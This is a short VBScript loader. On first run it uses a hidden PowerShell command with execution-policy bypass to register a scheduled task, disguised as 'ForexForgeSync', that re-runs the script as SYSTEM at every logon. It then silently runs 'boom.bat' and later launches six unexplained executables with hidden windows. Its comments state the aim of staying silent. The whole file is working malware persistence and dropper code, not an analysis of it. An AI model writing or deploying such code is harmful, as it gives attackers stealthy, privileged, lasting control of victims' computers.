Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get absolute paths properly
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
strScript = WScript.ScriptFullName

' --- STEP 1: POWERSHELL TASK CREATION ---
' We use -WindowStyle Hidden and -ExecutionPolicy Bypass to stay silent
' Added extra quotes to handle any spaces in the file path
If Not WScript.Arguments.Named.Exists("boot") Then
    psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & _
        "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '//B \""" & strScript & "\"" /boot'; " & _
        "$trigger = New-ScheduledTaskTrigger -AtLogOn; " & _
        "$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; " & _
        "Register-ScheduledTask -TaskName 'ForexForgeSync' -Action $action -Trigger $trigger -Principal $principal -Force"""
    
    ' Run PowerShell completely hidden
    WshShell.Run psCmd, 0, True
    
    ' First time run: Launch boom.bat
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 2: SILENT WAIT ---
' This happens in the background on reboot
WScript.Sleep 30000 

' --- STEP 3: LAUNCH THE 6 APPS ---
' 0 = Hidden window, False = Don't wait for them to finish
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False

WScript.Quit
